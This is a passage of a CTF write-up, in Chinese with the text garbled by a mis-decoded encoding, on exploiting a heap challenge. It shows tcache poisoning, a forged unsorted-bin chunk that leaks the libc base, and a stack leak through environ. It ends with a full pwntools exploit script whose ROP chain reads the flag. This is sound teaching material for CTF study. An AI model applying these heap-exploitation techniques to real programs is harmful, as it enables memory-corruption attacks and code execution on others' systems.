  å› ä¸º**tcache**ä¹Ÿæ˜¯æœ‰èŒƒå›´çš„ï¼Œå…¶æœ‰64ä¸ªæŒ‰ç…§é¦–é¡¹æ˜¯**4 * SIZE_SZ**ï¼Œå…¬å·®æ˜¯**2 * SIZE_SZ**çš„ç­‰å·®æ•°åˆ—åˆ†å¸ƒçš„èŒƒå›´ï¼Œå³å…¶å¤§å°èŒƒå›´é€šå¼ä¸º$$2 * SIZE\_SZ * (n + 1), 1 \leq n \leq 64$$ã€‚åªè¦æˆ‘ä»¬ç”³è¯·è¶³å¤Ÿå¤šçš„è¿ç»­å†…å­˜å—ï¼Œç„¶ååœ¨è¿™äº›è¿ç»­å†…å­˜å—ç»„æˆçš„å†…å­˜åŒºåŸŸï¼Œä¼ªé€ ä¸€ä¸ªå¤§å°ä¸º**2 \* SIZE_SZ \* 65**(32ä½ä¸º**0x208**ï¼Œ64ä½ä¸º**0x410**)çš„å†…å­˜(*æ³¨æ„è¿˜éœ€è¦ä¼ªé€ åé¢çš„åˆæ³•å†…å­˜ï¼Œå¦åˆ™æ— æ³•é€šè¿‡é‡Šæ”¾æ—¶çš„æ£€æµ‹*)ã€‚ä¹‹åé€šè¿‡å†™å…¥/è¦†ç›–æ‰**tcache**çš„**fd**å­—æ®µï¼Œå³å¯å°†è¯¥ä¼ªé€ å†…å­˜æ’å…¥åˆ°**tcache**é“¾ä¸Šï¼Œç„¶åç”³è¯·ååœ¨é‡Šæ”¾å³å¯ã€‚
  ä¸€èˆ¬çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹æ‰€ç¤º
  ![tcacheé‡Šæ”¾chunkè‡³unsorted bin](tcacheé‡Šæ”¾chunkè‡³unsorted bin.PNG)


### è·å–æ ˆå¸ƒå±€

  ç”±äº**tcache**åœ¨åˆ†å¸ƒæ—¶ï¼Œä¸ä¼šå»æ£€æŸ¥å½“å‰é“¾ä¸Šçš„å†…å­˜æ˜¯å¦ä¸ºåˆæ³•çš„binã€‚å› æ­¤ï¼Œåªè¦æˆ‘ä»¬å¯ä»¥æ§åˆ¶**tcache**é“¾çš„æŒ‡å‘ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ†é…åˆ°æŒ‡å‘éƒ¨åˆ†çš„å†…å­˜â€”â€”è¿™ä¸ºæˆ‘ä»¬è·å–ç¨‹åºçš„æ ˆåˆ†å¸ƒå¸¦æ¥äº†æå¤§çš„ä¾¿åˆ©ã€‚

  å®é™…ä¸Šï¼Œé€šè¿‡`man execve`å’Œ`man 7 environ`ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œglibcä¸­åŒ…å«æœ‰ç¨‹åºçš„ç¯å¢ƒå˜é‡çš„æŒ‡é’ˆæ•°ç»„ï¼Œå¦‚ä¸‹æ‰€ç¤º
  ```c
/*
       man execve

       The argument vector and environment can be accessed by the called program's main function, when it is defined as:

           int main(int argc, char *argv[], char *envp[])

       Note,  however,  that  the  use  of a third argument to the main function is not specified in POSIX.1; according to POSIX.1, the environment should be accessed via the external variable enviâ€
       ron(7).
*/


/*
       man 7 environ
       extern char **environ;

       The  variable environ points to an array of pointers to strings called the "environment".  The last pointer in this array has the value NULL.  (This variable must be declared in the user proâ€
       gram, but is declared in the header file <unistd.h> if the _GNU_SOURCE feature test macro is defined.)  This array of strings is made available to the process by the exec(3) call that started
       the process.  When a child process is created via fork(2), it inherits a copy of its parent's environment.
*/
```

  æ ¹æ®è®¡ç®—æœºåŸºç¡€çŸ¥è¯†ï¼Œæˆ‘ä»¬çŸ¥é“ç¯å¢ƒå˜é‡å°±æ˜¯**main**çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³ä½äºæ ˆä¸Šåˆ†å¸ƒã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬å·²ç»è·å–äº†glibcçš„åŸºå€ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥å°†**tcache**é“¾æŒ‡å‘**lib_base + lib.sym['environ']**ã€‚ç„¶åä¼šè·å–ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„ï¼Œå…¶æ¯ä¸€ä¸ªå…ƒç´ éƒ½æŒ‡å‘æ ˆä¸ŠæŸä¸ªä½ç½®ã€‚å¦‚æœæˆ‘ä»¬æ‰“å°å†…å­˜ä¸Šçš„æ•°æ®ï¼Œä¹Ÿå°±è·å–äº†æ ˆä¸Šçš„ç›¸å…³ä¿¡æ¯ã€‚

  åé¢å°±éå¸¸å¥½åˆ©ç”¨äº†â€”â€”å¦‚æœæœ‰äº†æ ˆä¿¡æ¯ï¼Œåˆ™é€šè¿‡æ ˆä¸Šå­˜å‚¨çš„è¿”å›åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ˜“çš„è·å–ä»£ç æ®µåœ°å€ï¼›æœ‰äº†ä»£ç æ®µåœ°å€ï¼Œåˆ™æˆ‘ä»¬é€šè¿‡è¦†å†™æ ˆä¸Šè¿”å›åœ°å€ï¼Œå¯ä»¥æ§åˆ¶æ‰§è¡Œæµ


## é¢˜è§£å’Œå…³é”®è¯´æ˜

  é¦–å…ˆï¼Œéœ€è¦é€šè¿‡å‰é¢åˆ†æè¿‡çš„å †å åŠ ï¼Œä»è€Œåœ¨å¤§å°å—é™çš„æƒ…å†µä¸‹ï¼Œå°†å¯æ§çš„å†…å­˜é‡Šæ”¾åˆ°**unsorted bin**ä¸­ï¼Œå‘½ä»¤å¦‚ä¸‹æ‰€ç¤º
  ```python
	for i in range(12):
		wp_add(r, i, 0x50)	#base + 0x60 * i
	
	#fake chunk: base + 0x20
	wp_delete(r, 1)
	wp_delete(r, 0)
	wp_show(r, 0)
	chunk_base = u64(r.recv(6).ljust(8, '\x00')) - 0x60 - 0x10
	log.info('chunk_base => %#x'%(chunk_base))
	wp_edit(r, 11, p64(0) * 2 + p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x21))
	wp_edit(r, 0, p64(chunk_base + 0x30) + p64(0) + p64(0) + p64(0x421) + p64(0))
```
  ä¸€æ–¹é¢ï¼Œåœ¨åºå·ä¸º0çš„å†…å­˜ä¸­æ„é€ äº†fake chunkçš„chunkå¤´ä¿¡æ¯ï¼›å¦ä¸€æ–¹é¢ï¼Œåœ¨åºå·ä¸º11çš„å†…å­˜ä¸­å®Œæˆä¸Šä¸‹æ–‡çš„æ„å»º(**ç”¨æ¥é‡Šæ”¾æ—¶ç»•è¿‡æ£€æŸ¥**)ã€‚æ­¤æ—¶ï¼Œå…¶å†…å­˜å¸ƒå±€å¦‚ä¸‹æ‰€ç¤º
  ![K1ng_in_h3Ap_IIå†…å­˜å¸ƒå±€1](K1ng_in_h3Ap_IIå†…å­˜å¸ƒå±€1.PNG)

  æ­¤æ—¶ï¼Œæˆ‘ä»¬å·²ç»å°†ä¼ªé€ çš„é**tcache bin**èŒƒå›´å†…çš„å†…å­˜å—æ’å…¥åˆ°**tcache**é“¾ä¸­ã€‚æ­¤æ—¶ï¼Œåªéœ€è¦ç”³è¯·åˆ°è¯¥å†…å­˜ï¼Œç„¶ååœ¨é‡Šæ”¾ï¼Œåˆ™å¯ä»¥å°†è¯¥å¯æ§çš„å†…å­˜å—é‡Šæ”¾å…¥**unsorted bin**ä¸­ï¼Œç›¸å½“äºæˆ‘ä»¬è·å–äº†glibcåŸºå€ã€‚

  é‚£ä¹ˆï¼Œæ¥ä¸‹æ¥å°±éå¸¸ç®€å•äº†â€”â€”æˆ‘ä»¬é€šè¿‡**UAF**ï¼Œç›´æ¥å°†**lib_base + p64(lib.sym['environ'])**æ’å…¥åˆ°**tcache**é“¾ä¸­ï¼Œç„¶åæ‰“å°ï¼Œå³å¯è·å–æ ˆçš„ç›¸å…³ä½ç½®ã€‚

  åœ¨è·å–æ ˆä½ç½®åï¼Œé€šè¿‡åç§»è®¡ç®—ï¼Œå¯ä»¥è·å–æŒ‡å®šçš„æ ˆå¸§ï¼Œé‚£ä¹ˆå°†è¯¥æ ˆå¸§ä½œä¸º**fake chunk**ï¼Œå‘è¯¥**fake chunk**å†™å…¥æ•°æ®ï¼Œåˆ™ç›¸å½“äºæ›´æ”¹æ ˆå¸§æ•°æ®ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥æ›´æ”¹å‡½æ•°è¿”å›åœ°å€ï¼Œåˆ™å¯ä»¥ä½¿ç”¨rop(è¿™é‡Œæœ€å¥½é€‰æ‹©editå‡½æ•°çš„æ ˆå¸§â€”â€”å¯¹äºå…¶ä»–å‡½æ•°æ ˆå¸§ï¼Œå…¶å…ˆé€šè¿‡è°ƒç”¨editå‡½æ•°è¦†ç›–æ ˆå¸§ï¼Œç„¶åå†åˆ°æŒ‡å®šå‡½æ•°è¢«è°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œæ ˆå¸§å¯èƒ½è¢«å…¶ä»–å‡½æ•°æ ˆå¸§å†æ¬¡è¦†ç›–)


  æœ€åï¼Œå®Œæ•´çš„wpå¦‚ä¸‹æ‰€ç¤º
  ```python
#!/usr/bin/python2
# -*- coding:utf-8 -*-
from pwn import *
import sys
import platform

'''
	å¾…ä¿®æ”¹æ•°æ®
'''
context.log_level = 'debug'
context.arch = 'amd64'				# 32ä½ä½¿ç”¨i386
context.os = 'linux'

execve_file = './pwn'
lib_file = './libc.so.6'
argv = []



'''
	elf.plt[`symbol`] è·å–elfæ–‡ä»¶ä¸­å¯¼å…¥ç¬¦å·çš„pltåœ°å€
	elf.got[`symbol`] è·å–elfæ–‡ä»¶ä¸­å¯¼å…¥ç¬¦å·çš„gotåœ°å€
	elf.sym['symbol'] è·å–elfæ–‡ä»¶ä¸­æœ¬åœ°ç¬¦å·çš„å‡½æ•°å®é™…åœ°å€
'''
if execve_file != None:
	elf = ELF(execve_file)

'''
	lib.sym[`symbol`] è·å–libä¸­ç¬¦å·åœ°å€
	lib.search['string'].next() è·å–libä¸­å­—ç¬¦ä¸²åœ°å€
'''
if lib_file != None:
	lib = ELF(lib_file)

log.info('-----------------------------------------------------------')


'''
	æ‰§è¡Œçˆ†ç ´æ”»å‡»
	åªæœ‰å½“æˆåŠŸè·å–shellæˆ–è€…é”®ç›˜Ctrl+Cé€€å‡ºæ—¶ï¼Œç¨‹åºä¸­æ­¢å¾ªç¯
	å¦åˆ™ç¨‹åºä¸€ç›´è¿›è¡Œå¾ªç¯
'''


def wp_add(r, idx, size):
	r.sendlineafter('>> \n', str(1))
	r.sendlineafter('input index:\n', str(idx))
	r.sendlineafter('input size:\n', str(size))

def wp_delete(r, idx):
	r.sendlineafter('>> \n', str(2))
	r.sendlineafter('input index:\n', str(idx))

def wp_edit(r, idx, context):
	r.sendlineafter('>> \n', str(3))
	r.sendlineafter('input index:\n', str(idx))
	r.sendlineafter('input context:\n', context)


def wp_show(r, idx):
	r.sendlineafter('>> \n', str(4))
	r.sendlineafter('input index:\n', str(idx))

def exp():
	if 'd' in sys.argv:
		#r = gdb.debug([execve_file] + argv)	# é¦–å…ˆåŠ è½½å½“å‰ç›®å½•ä¸‹çš„åŠ¨æ€åº“æ–‡ä»¶
		r = process([execve_file] + argv)	# é¦–å…ˆåŠ è½½å½“å‰ç›®å½•ä¸‹çš„åŠ¨æ€åº“æ–‡ä»¶
	else:
		r = remote(sys.argv[1], sys.argv[2])
	
	for i in range(12):
		wp_add(r, i, 0x50)	#base + 0x60 * i
	
	#fake chunk: base + 0x20
	wp_delete(r, 1)
	wp_delete(r, 0)
	wp_show(r, 0)
	chunk_base = u64(r.recv(6).ljust(8, '\x00')) - 0x60 - 0x10
	log.info('chunk_base => %#x'%(chunk_base))
	wp_edit(r, 11, p64(0) * 2 + p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x21))
	wp_edit(r, 0, p64(chunk_base + 0x30) + p64(0) + p64(0) + p64(0x421) + p64(0))


	# get the fake chunk and free
	wp_add(r, 0, 0x50)	#base
	wp_add(r, 13, 0x50)	#base + 0x20
	wp_delete(r, 13)
	wp_show(r, 13)
	lib_base = u64(r.recv(6).ljust(8, '\x00')) - 0x7fddc0f01ca0 + 0x7fddc0b16000
	log.info('lib_base => %#x'%(lib_base))

	# get the stack
	wp_delete(r, 3)
	wp_delete(r, 2)
	wp_edit(r, 2, p64(lib_base + lib.sym['environ']))
	wp_add(r, 2, 0x50)
	wp_add(r, 13, 0x50)
	wp_show(r, 13)
	edit_stack = u64(r.recv(6).ljust(8, '\x00')) - 0x7ffcb363c768 + 0x7ffcb363c640
	log.info('edit_stack => %#x'%(edit_stack))

	# get the code
	wp_delete(r, 5)
	wp_delete(r, 4)
	wp_edit(r, 4, p64(edit_stack + 0x10 + 8))
	wp_add(r, 4, 0x50)
	wp_add(r, 4, 0x50)
	wp_show(r, 4)
	code_base = u64(r.recv(6).ljust(8, '\x00')) - 0xfe1
	log.info('code_base => %#x'%(code_base))


	# rop: read(0, buf, 0x200)
	edit_stack = edit_stack + 0x10 + 8
	shellcode = p64(code_base + 0x104a) + p64(0) + p64(1) + p64(code_base + elf.got['read']) + p64(0) + p64(edit_stack + 0x8 * 8) + p64(8 * 31 + len('flag') + 1) + p64(code_base + 0x1030) + p64(0) + p64(0)[:-1]
	wp_edit(r, 4, shellcode)

	edit_stack = edit_stack + 0x8 * 8
	flag_addr = edit_stack + 8 * 31
	shellcode = p64(0) * 7 + p64(code_base + 0x1053) + p64(flag_addr) + p64(code_base + 0x1051) + p64(4) + p64(0) + p64(lib_base + lib.sym['open']) + p64(code_base + 0x104a) + p64(0) + p64(1) + p64(code_base + elf.got['read']) + p64(3) + p64(flag_addr) + p64(0x40) + p64(code_base + 0x1030) + p64(0) * 7 + p64(code_base + 0x1053) + p64(flag_addr) + p64(code_base + elf.plt['puts'])
	r.send(shellcode + 'flag\x00')
	r.interactive()


exp()
log.info('-----------------------------------------------------------')
```
